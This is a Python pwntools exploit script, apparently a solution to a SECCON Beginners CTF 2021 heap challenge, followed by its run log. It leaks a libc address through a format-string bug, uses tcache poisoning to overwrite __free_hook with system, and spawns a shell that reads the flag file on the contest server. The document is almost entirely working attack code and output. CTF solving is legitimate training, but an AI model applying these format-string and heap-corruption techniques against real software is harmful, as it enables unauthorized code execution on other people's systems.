from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './chall'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "uma-catch.quals.beginners.seccon.jp"
  PORT = 4101
  s = remote(HOST, PORT)
  libc = ELF("./libc-2.27.so")
else:
  s = process(BINARY)
  libc = elf.libc

def Catch(idx, color):
  s.sendlineafter("> ", "1")
  s.sendlineafter("> ", str(idx))
  s.sendlineafter("> ", color)

def Name(idx, name):
  s.sendlineafter("> ", "2")
  s.sendlineafter("> ", str(idx))
  s.sendlineafter("> ", name)

def Show(idx):
  s.sendlineafter("> ", "3")
  s.sendlineafter("> ", str(idx))

def Dance(idx):
  s.sendlineafter("> ", "4")
  s.sendlineafter("> ", str(idx))

def Release(idx):
  s.sendlineafter("> ", "5")
  s.sendlineafter("> ", str(idx))

# libc leak
Catch(0, "bay")
Name(0, "%11$p")
Show(0)

r = s.recvuntil("\n")[:-1]
libc_leak = int(r, 16)
libc_base = libc_leak - 0x21bf7
system_addr = libc_base + libc.sym.system
free_hook = libc_base + libc.sym.__free_hook
print "libc_leak =", hex(libc_leak)
print "libc_base =", hex(libc_base)

Catch(1, "bay")
Release(0)
Release(1)

# tcache poisoning
Name(1, p64(free_hook))

Catch(2, "bay")
Catch(3, "bay")
Name(3, p64(system_addr))
Name(2, "/bin/sh\x00")
Release(2)

s.interactive()

'''
mito@ubuntu:~/CTF/SECCON_Beginners_CTF_2021/Pwn_uma_catch/uma_catch$ python solve01.py r
[*] '/home/mito/CTF/SECCON_Beginners_CTF_2021/Pwn_uma_catch/uma_catch/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to uma-catch.quals.beginners.seccon.jp on port 4101: Done
[*] '/home/mito/CTF/SECCON_Beginners_CTF_2021/Pwn_uma_catch/uma_catch/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc_leak = 0x7fa9b79c5bf7
libc_base = 0x7fa9b79a4000
[*] Switching to interactive mode
$ id
uid=999(pwn) gid=999(pwn) groups=999(pwn)
$ ls -l
total 28
-r-xr-x--- 1 root pwn 17800 May 21 03:18 chall
-r--r----- 1 root pwn    43 May 21 03:18 flag.txt
-r-xr-x--- 1 root pwn    34 May 21 03:18 redir.sh
$ cat flag*
ctf4b{h34p_15_4ls0_m3m0ry_ju5t_l1k3_st4ck}
'''
